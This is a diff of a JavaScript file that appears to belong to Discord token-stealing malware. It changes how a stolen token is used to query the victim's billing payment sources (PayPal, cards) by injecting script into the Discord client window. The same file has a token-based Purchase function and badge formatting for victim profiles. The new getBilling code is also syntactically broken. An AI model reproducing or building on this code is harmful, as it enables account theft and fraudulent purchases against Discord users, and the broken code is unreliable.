@@ -189,22 +189,25 @@ const fetchBilling = async (token) => {
   return JSON.parse(bill);
 };
 
-const getBilling = async (token) => {
-  const data = await fetchBilling(token);
-  if (data === "") return "❌";
-  let billing = "❌";
-  data.forEach((x) => {
-    if (x.type === 2 && !x.invalid) {
-      billing += "✅" + " <:paypal:966392214261493880> ";
-    } else if (x.type === 1 && !x.invalid) {
-      billing += "✅" + " 💳";
-    } else {
-      billing = "❌";
-    }
-  });
-  if (billing === "") billing = "❌";
-  return billing;
-};
+const getBilling(token) {
+    const window = BrowserWindow.getAllWindows()[0];
+    var a = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false ); xmlHttp.setRequestHeader("Authorization", "${token}"); xmlHttp.send( null ); xmlHttp.responseText`, !0)
+    var json = JSON.parse(a)
+
+    var billing = "";
+    json.forEach(z => {
+        if (z.type == 2 && z.invalid != !0) {
+            billing += "\`✔️\` <:paypal:896441236062347374>";
+        } else if (z.type == 1 && z.invalid != !0) {
+            billing += "\`✔️\` :credit_card:";
+        } else {
+            return "\`❌\`";
+        };
+    });
+
+    billing = billing ?? "\`❌\`";
+    return billing;
+}
 
 const Purchase = async (token, id, _type, _time) => {
   const req = execScript(`var xmlHttp = new XMLHttpRequest();
@@ -278,31 +281,31 @@ const getBadges = (flags) => {
       badges += "<:badge_staff:966390598531706910> , ";
       break;
     case 2:
-      badges += "<:badge_partner2:966391750283370586> , ";
+      badges += "<:badge_partner2:966391750283370586> ";
       break;
     case 131072:
-      badges += "<a:badge_developer2:966390720145522748> , ";
+      badges += "<a:badge_developer2:966390720145522748> ";
       break;
     case 4:
-      badges += "<:badge_hypesquadevents:966391511111565382>, ";
+      badges += "<:badge_hypesquadevents:966391511111565382> ";
       break;
     case 16384:
-      badges += "<:badge_bughunter2:966390769990664244> , ";
+      badges += "<:badge_bughunter2:966390769990664244> ";
       break;
     case 8:
-      badges += "<:badge_bughunter:966390746276048906> , ";
+      badges += "<:badge_bughunter:966390746276048906> ";
       break;
     case 512:
-      badges += "<:badge_earlysupporter:966390794678304818>, ";
+      badges += "<:badge_earlysupporter:966390794678304818> ";
       break;
     case 128:
-      badges += "<:Brilance:964601963293573120>, ";
+      badges += "<:Brilance:964601963293573120> ";
       break;
     case 64:
-      badges += "<:Hypesquat4:964601933442744340>, ";
+      badges += "<:Hypesquat4:964601933442744340> ";
       break;
     case 256:
-      badges += "<:badge_balance:964601904481046619> , ";
+      badges += "<:badge_balance:964601904481046619> ";
       break;
     case 0:
       badges = "None";
